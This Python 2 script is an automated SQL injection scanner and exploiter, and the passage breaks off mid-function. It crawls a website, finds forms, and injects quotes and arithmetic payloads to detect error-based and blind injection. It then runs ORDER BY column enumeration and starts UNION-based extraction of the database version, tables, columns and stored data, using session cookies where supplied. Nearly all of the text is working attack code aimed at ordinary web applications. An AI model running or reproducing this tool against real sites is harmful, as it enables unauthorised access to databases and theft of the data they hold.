import datetime
import urllib
import urlparse
import requests
import sys
import cgi
from BeautifulSoup import *
import time

# VARIABLES
wrn = "[WARNING]"
inf = "[INFO]"


# Colors for print
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# Function that return the exact date n time
def tm():
    return "["+datetime.datetime.now().time().strftime('%H:%M:%S')+"]"


# Scrapping the entire WebSite
def crawler(url, quick):
    urls = [url]    # A list that all the links are going to be held initialized with the original url
    visited = [url]     # A list that keeps all the visited links
    incl_url = url.split("/")[2]  # A basic snippet of the original url tha must be included to all the links
    prev_url = list()   # A list that keeps the double links if Quick scan selected
    # For all the links of the web page
    print "Scraping...\n"
    while len(urls) > 0:
        try:
            html = urllib.urlopen(urls[0]).read()
        except:
            urls.pop(0)  # Removes the old urls
            # print "Is not stable."
            continue
        soup = BeautifulSoup(html)
        urls.pop(0)  # Removes the old urls
        links = soup('a', href=True)
        for link in links:
            new_page = urlparse.urljoin(url, link.get('href', None))    # Join the original url with the new link
            # print new_page    # Debugging
            if incl_url in new_page and new_page not in visited:
                if quick:
                    if "?" in new_page and new_page[:new_page.rfind('?')] in prev_url:    # Avoid double checking the same URL
                        continue
                    if "?" in new_page and new_page[:new_page.rfind('?')] not in prev_url:     # Avoid double checking the same URL
                        prev_url.append(new_page[:new_page.rfind('?')])
                urls.append(new_page)
                visited.append(new_page)
    # print "visited", visited      # Debugging
    return visited


# 1. Finds and returns all the links that contain Forms
def find_forms(given_links, show_messages):
    form_list = {}  # A list with links that contain forms
    prev_url = list()   # Avoid double checking the same URL
    prev_fdetails = list()  # Avoid double checking the same URL
    c_name = list()     # Cookie names
    c_value = list()    # Cookie values
    print "Press Enter to continue without cookie"
    cookies = (raw_input('Enter cookies: ')).strip()    # Entering the cookies
    print ""
    c_split = cookies.split(" ")
    for c in c_split:                                   # Making a dict with the cookies
        c_name.append(c[:c.find('=')])
        c_value.append(c[c.find('=')+1:])
    cookies_dict = dict(zip(c_name, c_value))
    del c_name[:]                                         # Empties the old cookies
    del c_value[:]
    for url in given_links:
        move_tonext1 = False     # Avoid double checking the same URL
        move_tonext2 = False     # Avoid double checking the same URL
        if "?" in url and url[:url.rfind('?')] in prev_url:    # Avoid double checking the same URL
            continue
        if "?" in url and url[:url.rfind('?')] not in prev_url:     # Avoid double checking the same URL
            prev_url.append(url[:url.rfind('?')])
        if show_messages:
            print tm(), inf, "Connecting to the URL..."
        try:
            # Without Cookies
            if cookies == "":                                   # Checking if there are cookies or not
                html = urllib.urlopen(url).read()
                soup = BeautifulSoup(html)
            # With Cookies
            else:
                html = requests.get(url, cookies=cookies_dict).text
                soup = BeautifulSoup(html)
            if show_messages:
                print tm(), inf, "Target URL is stable..."
                print "..........\n.........."
        except:
            print tm(), wrn, "Target URL is not stable!!!"
            print tm(), wrn, "Make sure you are connected to the internet.\n"
        variables = list()  # Keeps the injected code (URL parameters).
        slash = 0   # Checking how many '/' are in the URL.
        data = ""   # Contains the parameters (payload) (e.g, 24)
        f_num = 0   # Counts the number of the forms.

        # FORMS
        try:
            if soup('form'):
                print "URL with Form:", url
            # print soup('form')  # Debugging
            for frm in soup('form'):
                # Progress messages.
                f_num += 1
                try:
                    f_name = frm['name']
                except:
                    f_name = "-"
                try:
                    f_method = frm['method'].upper()
                except:
                    f_method = "GET"
                try:
                    f_action = frm['action']
                    if f_action == "#": f_action = ""   # To evala gia to DVWA (Den xero an prokalei provlmata)
                except:
                    f_action = url
                for prev_nameact in prev_fdetails:              # Avoid double checking the same URL
                    if prev_nameact == f_name+":"+f_action:     # Checking if the Form name and action are used
                        move_tonext1 = True
                        break
                if move_tonext1:                                # Avoid double checking the same URL
                    move_tonext2 = True
                    break
                prev_fdetails.append(f_name+":"+f_action)       # Updating with previous form details
                if show_messages:
                    print tm(), inf, "Searching for Forms..."
                    print "=================================================="
                    print "Form", f_num
                    print "=================================================="
                    print tm(), inf, "Checking Form..."
                    print tm(), inf, "Form name: '" + f_name + "'..."
                    print tm(), inf, "Request method used:", "'" + f_method + "'..."

                # Checking for the proper type of input
                for tag in frm('input'):
                    if tag['type'] == "submit":
                        try:
                            sub_name = tag['name']
                            sub_value = tag['value']
                        except:
                            sub_name = ""
                            sub_value = ""
                    if tag['type'] == "text" or \
                                    tag['type'] == "password" or \
                                    tag['type'] == "email" or \
                                    tag['type'] == "number" or \
                                    tag['type'] == "search" or \
                                    tag['type'] == "tel" or \
                                    tag['type'] == "url":
                        variables.append(tag['name'])   # Gets the name of the input
                        if show_messages:
                            print tm(), inf, "Input type:", "'" + tag['type'] + "'..."
                # Checking the "Select - Option" tags
                for tag in frm('select'):
                    variables.append(tag['name'])   # Gets the name of the input

                # Action fix
                if f_action[-1:] == "/":    # Removes the last /
                    rem_slash = f_action[::-1].replace("/", "", 1)[::-1]
                    if "/" in rem_slash:    # Keeps the word after the last /
                        act = rem_slash[:rem_slash.rfind('/'):-1][::-1]
                    else:                   # Keeps the word only since no / contained
                        act = rem_slash
                elif "/" in f_action:       # Keeps the word after the last /
                    act = f_action[:f_action.rfind('/'):-1][::-1]
                else:                       # Keeps the word only since no / contained
                    act = f_action
                if show_messages:
                    print tm(), inf, "Action:", "'" + act + "'..."

                # URL fix
                for char in url:    # Counts the /
                    if char == "/":
                        slash += 1
                if slash < 3:   # If there are only the 2 slashes of "http//", add a / in the end of the URL
                    url += "/"

                # For comparison with the Action
                temp_url = url[url.find('/') + 2::1]
                temp_url = temp_url.strip()
                if temp_url.endswith('/'):
                    temp_url = temp_url[::-1].replace("/", "", 1)[::-1]

                # For comparison with the URL
                temp_act = act
                temp_act = temp_act.strip()
                if temp_act.endswith('/'):
                    temp_act = temp_act[::-1].replace("/", "", 1)[::-1]

                if temp_url == temp_act:
                    url = url[:url.rfind('/')]
                else:
                    url = url[:url.rfind('/') + 1] + act
                if show_messages:
                    print tm(), inf, "New URL:", url

                # Appending parameters to the URL
                if show_messages:
                    print tm(), inf, "Forming the new URL..."
                for var in variables: data = data + var + "=2&"
                data = data[::-1].replace("&", "", 1)[::-1]
                if "?" in url:
                    new_page = url + "&" + data
                else:
                    new_page = url + "?" + data
                if show_messages:
                    print tm(), inf, "Formed URL:", new_page
                if sub_name != "":  # If tag name isn't empty then the string "$@#%" is appended
                    new_page = new_page+"$@%#"+"&"+sub_name+"="+sub_value
                form_list.update({new_page: f_method})

                # Reinitialization
                del variables[:]
                data = ""
                if show_messages:
                    print "\n"
            if move_tonext2:
                continue
        except:
            pass
    return form_list


# 2. Creates and returns the new links which arising out of the forms
# It used only for Forms (for the moment)
def find_sql_vul(vuln_pages):
    vuln_links = {}     # A list with vulnerable links
    vul_found = False       # Checks if vulnerability has been found
    count = 0               # A flag that indicates either to show the number of the form or not
    c_name = list()         # Cookie names
    c_value = list()        # Cookies values
    d_name = list()         # Data names
    d_value = list()        # Data values
    errors = {
        'MySQL': 'error in your SQL syntax',
        'SQLi_err': 'access shop category information',
        'MySQL_Valid_Argument': 'Supplied argument is not a valid MySQL result resource in',
        'MySQL_fetch': 'mysql_fetch_assoc()',
        'MySQL_array': 'mysql_fetch_array()',
        'MySQL_result': 'mysql_free_result()',
        'MySQL_start': 'session_start()',
        'MYSQL': 'getimagesize()',
        'MySQL_call': 'Call to a member function',
        'Oracle1': 'Microsoft OLE DB Provider for Oracle',
        'Mysql_re': 'Warning: require()',
        'MysQl_11': 'array_merge()',
        'MySQLi': 'mysql_query()',
        'Oracle': 'ORA-01756',
        'MiscError': 'SQL Error',
        'MiscError2': 'mysql_fetch_row',
        'MiscError3': 'num_rows',
        'JDBC_CFM': 'Error Executing Database Query',
        'JDBC_CFM2': 'SQLServer JDBC Driver',
        'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
        'MSSQL_Uqm': 'Unclosed quotation mark',
        'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
        'Postgrey_error': 'An error occurred',
        'SQL_errore': 'Unknown Column',
        'MS-Access_JETdb': 'Microsoft JET Database'
    }
    print "Press Enter to continue without cookie"
    cookies = (raw_input('Enter cookies: ')).strip()    # Entering the cookies
    print ""
    c_split = cookies.split(" ")
    for c in c_split:                                   # Making a dict with the cookies
        c_name.append(c[:c.find('=')])
        c_value.append(c[c.find('=')+1:])
    cookies_dict = dict(zip(c_name, c_value))
    del c_name[:]                                       # Empties the old cookies
    del c_value[:]
    for url, method in vuln_pages.items():
        count += 1
        if count > 1: print "\n"
        print "=================================================="
        print "Form", count
        print "=================================================="
        q = "'"
        if "$@%#" in url:
            new_page = url.replace("$@%#", q)
        else:
            new_page = url + q
        try:
            print tm(), inf, "Connecting to the URL..."
            if cookies == "":    # Without Cookies              # Checking if there are cookies or not
                # print "NO COOKIES (ERROR BASED)"      # DEBUGGING
                if method == "POST":     # POST Method          # Checking if the method is POST or GET
                    # print "METHOD POST (ERROR BASED)"     # DEBUGGING
                    pure_url = url[:url.rfind("?")]             # Extracting the original URL
                    data_list = new_page[new_page.rfind("?")+1:].split("&")
                    for dl in data_list:                        # Making a dictionary with data for the post request
                        d_name.append(dl[:dl.find('=')])
                        d_value.append(dl[dl.find('=')+1:])
                    data_dict = dict(zip(d_name, d_value))
                    del d_name[:]                               # Empties the old data
                    del d_value[:]
                    html = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                else:                    # GET Method
                    # print "METHOD GET (ERROR BASED)"      # DEBUGGING
                    html = urllib.urlopen(new_page).read()
            else:                # With Cookies
                # print "WITH COOKIES (ERROR BASED)"    # DEBUGGING
                if method == "POST":     # POST Method          # Checking if the method is POST or GET
                    # print "METHOD POST (ERROR BASED)"     # DEBUGGING
                    pure_url = url[:url.rfind("?")]             # Extracting the original URL
                    data_list = new_page[new_page.rfind("?")+1:].split("&")
                    for dl in data_list:                        # Making a dictionary with data for the post request
                        d_name.append(dl[:dl.find('=')])
                        d_value.append(dl[dl.find('=')+1:])
                    data_dict = dict(zip(d_name, d_value))
                    del d_name[:]                               # Empties the old data
                    del d_value[:]
                    html = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                else:                    # GET Method
                    # print "METHOD GET (ERROR BASED)"      # DEBUGGING
                    html = requests.get(new_page, cookies=cookies_dict).text                    # GET Request
            print tm(), inf, "Target URL is stable..."
            print "..........\n.........."
            print tm(), inf, "Injecting malicious code into the URL..."
            print tm(), inf, "Injected URL:", new_page
            print tm(), inf, "Testing for SQL injection..."
            # Trying error messages.
            for key, value in errors.items():
                if re.search(value, html):
                    print "\n", tm(), inf, "SQL injection is possible!"
                    print tm(), inf, "Error type:", key
                    print tm(), inf, "Injection type: error-based"
                    vuln_links.update({url: method})
                    vul_found = True
                    break
                else:
                    print tm(), inf, "Trying ", key+"..."
        except:
            print tm(), wrn, "Target URL is not stable!!!"
            print tm(), wrn, "Make sure you are connected to the internet.\n"

        # Second check - Checks if Quotes and Apostrophes are filtered (payload is a mathematical expression)
        if not vul_found:
            if "$@%#" in url:
                temp_before = url[:url.find('$@%#')]
                temp_after = url[url.find('$@%#'):]
                int_check = temp_before[temp_before.rfind('=')+1:]
            else:
                int_check = url[url.rfind('=')+1:]
                temp_after = ""
            if int_check.isdigit():
                int_check = int(int_check) + 1
                if cookies == "":
                    # print "NO COOKIES (BLIND)"      # DEBUGGING
                    if method == "POST":
                        # print "METHOD POST"     # DEBUGGING
                        data_list = url.replace("$@%#", "")[url.rfind("?")+1:].split("&")
                        for dl in data_list:                        # Making a dictionary with data for the post request
                            d_name.append(dl[:dl.find('=')])
                            d_value.append(dl[dl.find('=')+1:])
                        data_dict = dict(zip(d_name, d_value))
                        del d_name[:]                               # Empties the old data
                        del d_value[:]
                        html = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                    else:
                        # print "METHOD GET"     # DEBUGGING
                        html = urllib.urlopen(url.replace("$@%#", "")).read()   # URL as it is
                    if "$@%#" in url:
                        tampered_url = url.replace(url[url.find('$@%#')-1:], int_check.__str__() + "-1")
                        temp_after = temp_after.replace('$@%#', "")
                        if method == "POST":
                            # print "METHOD POST"     # DEBUGGING
                            data_list = (tampered_url + temp_after)[url.rfind("?")+1:].split("&")
                            for dl in data_list:                        # Making a dictionary with data for the post request
                                d_name.append(dl[:dl.find('=')])
                                d_value.append(dl[dl.find('=')+1:])
                            data_dict = dict(zip(d_name, d_value))
                            del d_name[:]                               # Empties the old data
                            del d_value[:]
                            html_compare = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                        else:
                            # print "METHOD GET"     # DEBUGGING
                            html_compare = urllib.urlopen(tampered_url + temp_after).read()  # URL with payload
                        # print url.replace("$@%#", "")       # DEBUGGING
                        # print tampered_url + temp_after     # DEBUGGING
                    else:
                        tampered_url = url.replace(url[url.rfind('=')+1:], "") + int_check.__str__() + "-1"
                        if method == "POST":
                            # print "METHOD POST"     # DEBUGGING
                            data_list = tampered_url[url.rfind("?")+1:].split("&")
                            for dl in data_list:                        # Making a dictionary with data for the post request
                                d_name.append(dl[:dl.find('=')])
                                d_value.append(dl[dl.find('=')+1:])
                            data_dict = dict(zip(d_name, d_value))
                            del d_name[:]                               # Empties the old data
                            del d_value[:]
                            html_compare = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                        else:
                            # print "METHOD GET"     # DEBUGGING
                            html_compare = urllib.urlopen(tampered_url).read()  # URL with payload
                        # print url.replace("$@%#", "")       # DEBUGGING
                        # print tampered_url                  # DEBUGGING
                else:
                    if method == "POST":
                        # print "METHOD POST"     # DEBUGGING
                        data_list = url.replace("$@%#", "")[url.rfind("?")+1:].split("&")
                        for dl in data_list:                        # Making a dictionary with data for the post request
                            d_name.append(dl[:dl.find('=')])
                            d_value.append(dl[dl.find('=')+1:])
                        data_dict = dict(zip(d_name, d_value))
                        del d_name[:]                               # Empties the old data
                        del d_value[:]
                        html = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                    else:
                        # print "METHOD GET"     # DEBUGGING
                        html = requests.get(url.replace("$@%#", ""), cookies=cookies_dict).text   # URL as it is
                    if "$@%#" in url:
                        tampered_url = url.replace(url[url.find('$@%#')-1:], int_check.__str__() + "-1")
                        temp_after = temp_after.replace('$@%#', "")
                        if method == "POST":
                            # print "METHOD POST"     # DEBUGGING
                            data_list = (tampered_url + temp_after)[url.rfind("?")+1:].split("&")
                            for dl in data_list:                        # Making a dictionary with data for the post request
                                d_name.append(dl[:dl.find('=')])
                                d_value.append(dl[dl.find('=')+1:])
                            data_dict = dict(zip(d_name, d_value))
                            del d_name[:]                               # Empties the old data
                            del d_value[:]
                            html_compare = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                        else:
                            # print "METHOD GET"     # DEBUGGING
                            html_compare = requests.get(tampered_url + temp_after, cookies=cookies_dict).text   # URL with payload
                        # print url.replace("$@%#", "")       # DEBUGGING
                        # print tampered_url + temp_after     # DEBUGGING
                    else:
                        tampered_url = url.replace(url[url.rfind('=')+1:], "") + int_check.__str__() + "-1"
                        if method == "POST":
                            # print "METHOD POST"     # DEBUGGING
                            data_list = tampered_url[url.rfind("?")+1:].split("&")
                            for dl in data_list:                        # Making a dictionary with data for the post request
                                d_name.append(dl[:dl.find('=')])
                                d_value.append(dl[dl.find('=')+1:])
                            data_dict = dict(zip(d_name, d_value))
                            del d_name[:]                               # Empties the old data
                            del d_value[:]
                            html_compare = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                        else:
                            # print "METHOD GET"     # DEBUGGING
                            html_compare = requests.get(tampered_url, cookies=cookies_dict).text    # URL with payload
                        # print url.replace("$@%#", "")       # DEBUGGING
                        # print tampered_url                  # DEBUGGING
                if html == html_compare:     # Checking pages for differences (If no differences)
                    print ""
                    print tm(), wrn, "Seems like apostrophes and quotation marks are screened with backslashes."
                    print tm(), inf, "Trying another method."
                    print tm(), inf, "Original URL:", url.replace("$@%#", "")
                    print tm(), inf, "Injected URL:", tampered_url + temp_after
                    # print html            # DEBUGGING
                    # print html_compare    # DEBUGGING

                    print "\n", tm(), inf, "SQL injection is possible!"
                    print tm(), inf, "Error type: disabled"
                    print tm(), inf, "Injection type: blind"
                    vuln_links.update({url: method})
                else:                   # If there is a difference
                    print ""
                    # print html            # DEBUGGING
                    # print html_compare    # DEBUGGING
                    print tm(), inf, "SQL Injection is not possible"
        vul_found = False
    return vuln_links


# 3. Scans and displays all the information extracted from the DataBase
def find_db_info(vuln_links):
    count = 0
    for vul_page, method in vuln_links.items():
        skata = ""   # For testing and only
        form_mode = False
        scan_db = False  # For continue scanning database
        par_break = False
        cont_union = False  # For continue with union technique
        search_columns = False  # You can choose rather to search for information or not
        result_limit = False    # You can choose rather to limit results by 10 or not
        sp = ""      # Setting up a way to put spaces
        column_num = 0      # Initializing column number
        clmn_list = "1"     # Initializing column list
        db_payload1 = "version()"  # Payload 1 for database version
        db_payload2 = ""  # Payload 2 for database version
        should_restart = True   # Start the loop from the beginning
        payload_counter = 0     # Counter for choosing the payload to put each time
        tbl_limit = 1   # Increasing the limit to find more tables
        clmn_limit = 1  # Increasing the limit to find more columns
        clinfo_limit = 1    # Increasing the limit to find more information
        tbl_num = 1  # Increasing the limit to find more columns
        tbl_out1 = 0    # Flag for getting out of a specific loop
        tbl_out2 = 0    # Flag for getting out of a specific loop
        clmn_out1 = 0   # Flag for getting out of a specific loop
        clmn_out2 = 0   # Flag for getting out of a specific loop
        clinfo_out1 = 0   # Flag for getting out of a specific loop
        clinfo_out2 = 0   # Flag for getting out of a specific loop
        num = 1         # Iterating between tables
        rem_clmn = 0    # A number that defines the columns to be removed
        concat_string = ""   # String appended with table's columns for the concat query
        tbl_changed1 = True     # When true, the table changes
        tbl_changed2 = False    # When true, the table changes
        first_info = list()     # List with the first three info
        tables = list()     # List with tables
        columns = list()     # List with columns (nomizo i diafora me to apokato einai oti afto xrisimopoieite gia na emfanistoun sosta sto telos)
        columns_forinfo = list()    # List with columns (eno afto prepei na einai gia na ginei i douleia sta information, dld na vrethoun)
        column_info = list()    # List with the columns information
        fake_diff = False   # Getting inside the if statement without having found any difference
        c_name = list()     # Cookie names
        c_value = list()    # Cookie values
        d_name = list()         # Data names
        d_value = list()        # Data values
        words = []      # Stores the different word. It is used so it can change tha table/column if a message displayed instead of nothing (fake diff alternative)
        same_word = False   # Flag that indicates that a message is displayed (e.g, Invalid Input parameter)
        tbl_del = 0     # Flag that allows to remove the last table for the list (e.g, Invalid Input parameter)
        last_clmn_remove = False    # Flag to remove the last column from the list, if there is a message like (Invalid Input parameter)

        count += 1
        if count > 1: print "\n\nYou can continue scanning the", count, "link"

        if "$@%#" in vul_page:
            form_mode = True

        # Choose to scan the DB for info
        while True:
            print "\n\n1. Scan for database"
            print "2. Exit"
            ch = raw_input("")
            print ""
            if ch == "1":
                scan_db = True
                break
            if ch == "2":
                exit()
                break

        # Spaces preferences
        while True:
            print "\nSet a way of spacing"
            print "1. +"
            print "2. /**/"
            ch = raw_input("")
            print ""
            if ch == "1":
                sp = "+"
                break
            if ch == "2":
                sp = "/**/"
                break

        # Limit preferences
        while True:
            print "\nSet a limit start point"
            print "1. limit 0,1 --"
            print "2. limit 1,1 --"
            ch = raw_input("")
            print ""
            if ch == "1":
                tbl_limit = 0
                clmn_limit = 0
                clinfo_limit = 0
                set_tbl_lmt = 0     # initiates the table limit inside the loop
                set_clmn_lmt = 0    # initiates the column limit inside the loop
                set_clinfo_lmt = 0  # initiates the column info limit inside the loop
                break
            if ch == "2":
                tbl_limit = 1
                clmn_limit = 1
                clinfo_limit = 1
                set_tbl_lmt = 1     # initiates the table limit inside the loop
                set_clmn_lmt = 1   # initiates the column limit inside the loop
                set_clinfo_lmt = 1  # initiates the column info limit inside the loop
                break

        # Checks for string based injection (If it's a number but not an int, it's considered as an int and it doesn't works)
        if form_mode:
            if vul_page.count("=") > 1:
                temp_vul_page = vul_page[:vul_page.find('$@%#')]
                string_check = temp_vul_page[temp_vul_page.rfind('=')+1:]
                # print "Form Mode with more than one =", string_check   # Debugging
            else:
                string_check = vul_page[vul_page.rfind('=')+1:]
                # print "Form Mode with one =", string_check   # Debugging
        else:
            string_check = vul_page[vul_page.rfind('=')+1:]
            # print "Not Form Mode", string_check   # Debugging
        if not string_check.isdigit():
            if form_mode:
                vul_page = vul_page.replace("$@%#", "'$@%#")
            else:
                vul_page += "'"
            plus = sp + "-"
        else:
            plus = ""

        print ""
        print "Press Enter to continue without cookie"
        cookies = (raw_input('Enter cookies: ')).strip()
        c_split = cookies.split(" ")
        for c in c_split:
            c_name.append(c[:c.find('=')])
            c_value.append(c[c.find('=')+1:])
        cookies_dict = dict(zip(c_name, c_value))
        del c_name[:]
        del c_value[:]

        # Scanning DB for average columns using ORDER BY clause
        if scan_db:
            # 1) Order by (default)
            print tm(), inf, "ORDER BY technique seems to be usable"
            proggress = "["+datetime.datetime.now().time().strftime('%H:%M:%S')+"] [ - ]  searching..."  # Graphic progress.
            par = ""
            for par_num in range(1, 6):     # Checking for parentheses and how many
                for column in range(1, 50):     # Scanning for 50 columns with a payload (without the --)
                    sys.stdout.write(proggress+".")     # Graphic progress.
                    ord_by_err_glassfish = "Unknown column &#39;"+column.__str__()+"&#39; in &#39;order clause&#39;"
                    ord_by_err = "Unknown column '"+column.__str__()+"' in 'order clause'"
                    ord_by_err2 = "mysql_fetch_array()"
                    if form_mode:
                        db_url = vul_page.replace("$@%#", par + sp + "order" + sp + "by" + sp + column.__str__() + "--" + plus)  # Order by Payload
                        # print "Form mode enabled", db_url   # Debugging
                    else:
                        db_url = vul_page + par + sp + "order" + sp + "by" + sp + column.__str__() + "--" + plus   # Order by Payload
                        # print "Form mode disabled", db_url  # Debugging
                    try:
                        if cookies == "":
                            # print "NO COOKIES"      # DEBUGGING
                            if method == "POST":     # POST Method          # Checking if the method is POST or GET
                                # print "METHOD POST"     # DEBUGGING
                                pure_url = vul_page[:vul_page.rfind("?")]             # Extracting the original URL
                                data_list = db_url[db_url.rfind("?")+1:].split("&")
                                for dl in data_list:                        # Making a dictionary with data for the post request
                                    d_name.append(dl[:dl.find('=')])
                                    d_value.append(dl[dl.find('=')+1:])
                                data_dict = dict(zip(d_name, d_value))
                                del d_name[:]                               # Empties the old data
                                del d_value[:]
                                db_html = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                            else:
                                # print "METHOD GET"      # DEBUGGING
                                db_html = urllib.urlopen(db_url).read()
                        else:
                            # print "WITH COOKIES"    # DEBUGGING
                            if method == "POST":     # POST Method          # Checking if the method is POST or GET
                                # print "METHOD POST"     # DEBUGGING
                                pure_url = vul_page[:vul_page.rfind("?")]             # Extracting the original URL
                                data_list = db_url[db_url.rfind("?")+1:].split("&")
                                for dl in data_list:                        # Making a dictionary with data for the post request
                                    d_name.append(dl[:dl.find('=')])
                                    d_value.append(dl[dl.find('=')+1:])
                                data_dict = dict(zip(d_name, d_value))
                                del d_name[:]                               # Empties the old data
                                del d_value[:]
                                db_html = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                            else:
                                db_html = requests.get(db_url, cookies=cookies_dict).text
                    except:
                        print tm(), wrn, "Injected URL is not stable!!!"
                        print tm(), wrn, "Please make sure you are connected to the internet and try again"
                        break
                    if re.search(ord_by_err, db_html) or re.search(ord_by_err_glassfish, db_html) or re.search(ord_by_err2, db_html):
                        column_num = column - 1     # Setting the number of the columns that have been found
                        # print "Aaaaaaaaaaaaaaaaaaaa", column_num	# Debugging
                        par_break = True
                        break
                    proggress = ""
                if par_break: break     # Breaking the loop when the used number of parentheses found
                par += ")"      # Increasing the number of parentheses
                plus = sp + "-"     # Appending the minus at the end (Needed when parentheses are opened)
            print ""
            if column_num == 0:
                print tm(), inf, "Unable to find the number of the columns"
                while True:
                    ch = raw_input("Do you want to perform a String Based Attack? [y/N]: ")
                    if ch == "y" or ch == "Y":
                        str_based = True
                        if form_mode:
                            vul_page = vul_page.replace("$@%#", "'$@%#")
                        else:
                            vul_page += "'"
                        plus = sp + "-"
                        break
                    if ch == "N" or ch == "n":
                        exit()
            else:
                print tm(), inf, "The target URL appears to have", column_num, "column(s) in query"
                str_based = False

            # 2) Order by (String Based)
            if str_based:
                proggress = "["+datetime.datetime.now().time().strftime('%H:%M:%S')+"] [ - ]  searching..."  # Graphic progress.
                par = ""
                for par_num in range(1, 6):     # Checking for parentheses and how many
                    for column in range(1, 50):     # Scanning for 50 columns with a payload (without the --)
                        sys.stdout.write(proggress+".")     # Graphic progress.
                        ord_by_err_glassfish = "Unknown column &#39;"+column.__str__()+"&#39; in &#39;order clause&#39;"
                        ord_by_err = "Unknown column '"+column.__str__()+"' in 'order clause'"
                        ord_by_err2 = "mysql_fetch_array()"
                        if form_mode:
                            db_url = vul_page.replace("$@%#", par + sp + "order" + sp + "by" + sp + column.__str__() + "--" + plus)  # Order by Payload
                            # print "Form mode enabled", db_url   # Debugging
                        else:
                            db_url = vul_page + par + sp + "order" + sp + "by" + sp + column.__str__() + "--" + plus   # Order by Payload
                            # print "Form mode disabled", db_url  # Debugging
                        try:
                            if cookies == "":
                                # print "NO COOKIES"      # DEBUGGING
                                if method == "POST":     # POST Method          # Checking if the method is POST or GET
                                    # print "METHOD POST"     # DEBUGGING
                                    pure_url = vul_page[:vul_page.rfind("?")]             # Extracting the original URL
                                    data_list = db_url[db_url.rfind("?")+1:].split("&")
                                    for dl in data_list:                        # Making a dictionary with data for the post request
                                        d_name.append(dl[:dl.find('=')])
                                        d_value.append(dl[dl.find('=')+1:])
                                    data_dict = dict(zip(d_name, d_value))
                                    del d_name[:]                               # Empties the old data
                                    del d_value[:]
                                    db_html = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                                else:
                                    # print "METHOD GET"      # DEBUGGING
                                    db_html = urllib.urlopen(db_url).read()
                            else:
                                # print "WITH COOKIES (ERROR BASED)"    # DEBUGGING
                                if method == "POST":     # POST Method          # Checking if the method is POST or GET
                                    # print "METHOD POST (ERROR BASED)"     # DEBUGGING
                                    pure_url = vul_page[:vul_page.rfind("?")]             # Extracting the original URL
                                    data_list = db_url[db_url.rfind("?")+1:].split("&")
                                    for dl in data_list:                        # Making a dictionary with data for the post request
                                        d_name.append(dl[:dl.find('=')])
                                        d_value.append(dl[dl.find('=')+1:])
                                    data_dict = dict(zip(d_name, d_value))
                                    del d_name[:]                               # Empties the old data
                                    del d_value[:]
                                    db_html = requests.post(pure_url, data=data_dict, cookies=cookies_dict).text   # POST Request
                                else:
                                    db_html = requests.get(db_url, cookies=cookies_dict).text
                        except:
                            print ""
                            print tm(), wrn, "Injected URL is not stable!!!"
                            print tm(), wrn, "Please make sure you are connected to the internet and try again"
                            break
                        if re.search(ord_by_err, db_html) or re.search(ord_by_err_glassfish, db_html) or re.search(ord_by_err2, db_html):
                            column_num = column - 1     # Setting the number of the columns that have been found
                            # print "Bbbbbbbbbbbbbbbb", column_num	# Debugging
                            par_break = True
                            break
                        proggress = ""
                    if par_break: break     # Breaking the loop when the used number of parentheses found
                    par += ")"      # Increasing the number of parentheses
                    plus = sp + "-"     # Appending the minus at the end (Needed when parentheses are opened)
                print ""
                if column_num == 0:
                    print tm(), inf, "Unable to find the number of the columns"
                    exit()
                else:
                    print tm(), inf, "The target URL appears to have", column_num, "column(s) in query"

            # Choose to do Union all technique or exit.
            while True:
                ch = raw_input("UNION technique seems to be usable. Do you want to continue? [y/N]: ")
                if ch == "y" or ch == "Y":
                    cont_union = True
                    break
                if ch == "N" or ch == "n":
                    exit()
                    break

            # Choose to search the columns for information or not.
            while True:
                ch = raw_input("Do you want to search the columns for information? [y/N]: ")
                if ch == "y" or ch == "Y":
                    search_columns = True
                    break
                if ch == "N" or ch == "n":
                    search_columns = False
                    break

            # Choose to put a limit in the first 10 results or not.
            if search_columns:
                while True:
                    ch = raw_input("Do you want to limit the results for each column by 3? [y/N]: ")
                    if ch == "y" or ch == "Y":
                        result_limit = True
                        break
                    if ch == "N" or ch == "n":
                        result_limit = False
                        break

            # Finding Database information (UNION BASED)
            # NO /*!00000.....*/ BYPASS METHOD!!!
            if cont_union:
                if form_mode:
                    if vul_page.count("=") > 1:
                        temp_vul_page = vul_page[:vul_page.find('$@%#')]
                        if vul_page[vul_page.find('$@%#')-1] == "'":
                            vul_page = temp_vul_page[:temp_vul_page.rfind('=')+1:] + "-" + string_check + "'" + vul_page[vul_page.find('$@%#'):]
                        else:
                            vul_page = temp_vul_page[:temp_vul_page.rfind('=')+1:] + "-" + string_check + vul_page[vul_page.find('$@%#'):]
                    else:
                        vul_page = vul_page[:vul_page.rfind('=')+1] + "-" + vul_page[vul_page.rfind('=')+1:]  # Adding - after =
                else:
                    vul_page = vul_page[:vul_page.rfind('=')+1] + "-" + vul_page[vul_page.rfind('=')+1:]  # Adding - after =
                for clmn_num in range(2, column_num+1):     # Create a string with column's number
                    clmn_list = clmn_list+","+clmn_num.__str__()
                # Wrapping for loop with a while loop so we can start over again the for loop for all payloads
                proggress = "["+datetime.datetime.now().time().strftime('%H:%M:%S')+"] [ - ]  searching..."
                print "searching..."
                while should_restart:
                    # sys.stdout.write(proggress+".")     # Graphic progress.
                    should_continue = False
                    should_restart = False
                    dbinfo1_found = False
                    dbinfo2_found = False
                    dbinfo3_found = False
                    dbinfo4_found = False
                    dbinfo5_found = False
                    dbinfo_exit = False
                    loop_counter = 0
                    for clmn_num in range(1, column_num+1):    # Looping throw column nums trying to find the vulnerable one
                        loop_counter += 1   # Increasing until it gets equals to column num
                        if form_mode:
